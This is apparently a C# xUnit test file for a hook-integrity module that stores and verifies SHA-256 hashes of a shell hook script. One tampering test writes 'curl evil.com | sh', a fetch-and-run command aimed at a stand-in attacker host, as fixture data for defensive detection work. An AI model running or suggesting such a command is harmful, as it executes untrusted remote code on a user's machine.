using System;
using System.IO;
using System.Runtime.InteropServices;
using RtkSharp.Hooks;
using Xunit;

namespace RtkSharp.Tests.Hooks;

/// <summary>
/// A <see cref="FactAttribute"/> that skips on any non-Unix platform. Used for the one Rust test
/// gated behind <c>#[cfg(unix)]</c> (<c>test_hash_file_permissions</c>, integrity.rs:469-483), which
/// asserts the hash sidecar's Unix file mode — a check that is structurally inapplicable on Windows,
/// where <see cref="Integrity.StoreHash"/> deliberately skips all permission changes (see its
/// remarks). Mirrors the existing <c>WindowsOnlyFactAttribute</c> pattern
/// (<c>RtkSharp.Tests/Execution/PathResolverTests.cs</c>).
/// </summary>
public sealed class UnixOnlyFactAttribute : FactAttribute
{
    public UnixOnlyFactAttribute()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            Skip = "Unix-only: hash file permissions are not managed on Windows.";
        }
    }
}

/// <summary>
/// Port of Rust <c>src/hooks/integrity.rs</c>'s <c>mod tests</c> (integrity.rs:324-579), 1:1, as the
/// acceptance battery for <see cref="Integrity"/>. Each test uses a throwaway <see cref="TempDir"/>
/// standing in for Rust's <c>TempDir</c>, exactly mirroring the fixture-driven shape of the originals.
/// </summary>
public sealed class IntegrityTests
{
    [Fact]
    public void ComputeHash_IsDeterministic()
    {
        using var temp = new TempDir();
        var file = Path.Combine(temp.Root, "test.sh");
        File.WriteAllText(file, "#!/bin/bash\necho hello\n");

        var hash1 = Integrity.ComputeHash(file);
        var hash2 = Integrity.ComputeHash(file);

        Assert.Equal(hash1, hash2);
        Assert.Equal(64, hash1.Length); // SHA-256 = 64 hex chars
        Assert.All(hash1, c => Assert.True(Uri.IsHexDigit(c)));
    }

    [Fact]
    public void ComputeHash_ChangesOnModification()
    {
        using var temp = new TempDir();
        var file = Path.Combine(temp.Root, "test.sh");

        File.WriteAllText(file, "original content");
        var hash1 = Integrity.ComputeHash(file);

        File.WriteAllText(file, "modified content");
        var hash2 = Integrity.ComputeHash(file);

        Assert.NotEqual(hash1, hash2);
    }

    [Fact]
    public void StoreAndVerify_Ok()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        File.WriteAllText(hook, "#!/bin/bash\necho test\n");

        Integrity.StoreHash(hook);

        var status = Integrity.VerifyHookAt(hook);
        Assert.Equal(IntegrityStatus.Verified, status);
    }

    [Fact]
    public void Verify_DetectsTampering()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        File.WriteAllText(hook, "#!/bin/bash\necho original\n");

        Integrity.StoreHash(hook);

        // Tamper with hook.
        File.WriteAllText(hook, "#!/bin/bash\ncurl evil.com | sh\n");

        var status = Integrity.VerifyHookAt(hook);
        Assert.Equal(IntegrityStatusKind.Tampered, status.Kind);
        Assert.NotEqual(status.Expected, status.Actual);
        Assert.Equal(64, status.Expected!.Length);
        Assert.Equal(64, status.Actual!.Length);
    }

    [Fact]
    public void Verify_NoBaseline()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        File.WriteAllText(hook, "#!/bin/bash\necho test\n");

        // No hash file stored.
        var status = Integrity.VerifyHookAt(hook);
        Assert.Equal(IntegrityStatus.NoBaseline, status);
    }

    [Fact]
    public void Verify_NotInstalled()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        // Don't create hook file.

        var status = Integrity.VerifyHookAt(hook);
        Assert.Equal(IntegrityStatus.NotInstalled, status);
    }

    [Fact]
    public void Verify_OrphanedHash()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");

        // Create hash but no hook.
        File.WriteAllText(
            hashFile,
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  rtk-rewrite.sh\n");

        var status = Integrity.VerifyHookAt(hook);
        Assert.Equal(IntegrityStatus.OrphanedHash, status);
    }

    [Fact]
    public void StoreHash_CreatesSha256sumFormat()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        File.WriteAllText(hook, "test content");

        Integrity.StoreHash(hook);

        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");
        Assert.True(File.Exists(hashFile));

        var content = File.ReadAllText(hashFile);
        // Format: "<64 hex chars>  rtk-rewrite.sh\n"
        Assert.EndsWith("  rtk-rewrite.sh\n", content, StringComparison.Ordinal);
        var parts = content.Trim().Split("  ", 2, StringSplitOptions.None);
        Assert.Equal(2, parts.Length);
        Assert.Equal(64, parts[0].Length);
        Assert.Equal("rtk-rewrite.sh", parts[1]);
    }

    [Fact]
    public void StoreHash_OverwritesExisting()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");

        File.WriteAllText(hook, "version 1");
        Integrity.StoreHash(hook);
        var hash1 = Integrity.ComputeHash(hook);

        File.WriteAllText(hook, "version 2");
        Integrity.StoreHash(hook);
        var hash2 = Integrity.ComputeHash(hook);

        Assert.NotEqual(hash1, hash2);

        // Verify uses new hash.
        var status = Integrity.VerifyHookAt(hook);
        Assert.Equal(IntegrityStatus.Verified, status);
    }

    [UnixOnlyFact]
    public void HashFile_HasReadOnlyPermissions()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        File.WriteAllText(hook, "test");

        Integrity.StoreHash(hook);

        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");

        // CA1416 flags File.GetUnixFileMode as unsupported on Windows, but this fact is skipped
        // there entirely (see UnixOnlyFactAttribute), so the call is never reached on that platform.
#pragma warning disable CA1416
        var mode = File.GetUnixFileMode(hashFile);
#pragma warning restore CA1416
        var expected = UnixFileMode.UserRead | UnixFileMode.GroupRead | UnixFileMode.OtherRead;
        Assert.Equal(expected, mode & (UnixFileMode)0b111_111_111);
    }

    [Fact]
    public void RemoveHash_RemovesExistingFile()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        File.WriteAllText(hook, "test");

        Integrity.StoreHash(hook);
        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");
        Assert.True(File.Exists(hashFile));

        var removed = Integrity.RemoveHash(hook);
        Assert.True(removed);
        Assert.False(File.Exists(hashFile));
    }

    [Fact]
    public void RemoveHash_NotFound()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");

        var removed = Integrity.RemoveHash(hook);
        Assert.False(removed);
    }

    [Fact]
    public void InvalidHashFile_IsRejected()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");

        File.WriteAllText(hook, "test");
        File.WriteAllText(hashFile, "not-a-valid-hash  rtk-rewrite.sh\n");

        Assert.Throws<InitAbortException>(() => Integrity.VerifyHookAt(hook));
    }

    [Fact]
    public void HashOnlyNoFilename_IsRejected()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");

        File.WriteAllText(hook, "test");
        // Hash with no two-space separator and filename.
        File.WriteAllText(
            hashFile,
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\n");

        Assert.Throws<InitAbortException>(() => Integrity.VerifyHookAt(hook));
    }

    [Fact]
    public void WrongSeparator_IsRejected()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");

        File.WriteAllText(hook, "test");
        // Single space instead of two-space separator.
        File.WriteAllText(
            hashFile,
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 rtk-rewrite.sh\n");

        Assert.Throws<InitAbortException>(() => Integrity.VerifyHookAt(hook));
    }

    [Fact]
    public void HashFormat_IsCompatibleWithSha256sum()
    {
        using var temp = new TempDir();
        var hook = Path.Combine(temp.Root, "rtk-rewrite.sh");
        File.WriteAllText(hook, "#!/bin/bash\necho hello\n");

        Integrity.StoreHash(hook);

        var hashFile = Path.Combine(temp.Root, ".rtk-hook.sha256");
        var content = File.ReadAllText(hashFile);

        // Should be parseable by sha256sum -c.
        // Format: "<hash>  <filename>\n"
        var parts = content.Trim().Split("  ", 2, StringSplitOptions.None);
        Assert.Equal(2, parts.Length);
        Assert.Equal(64, parts[0].Length);
        Assert.Equal("rtk-rewrite.sh", parts[1]);
    }
}
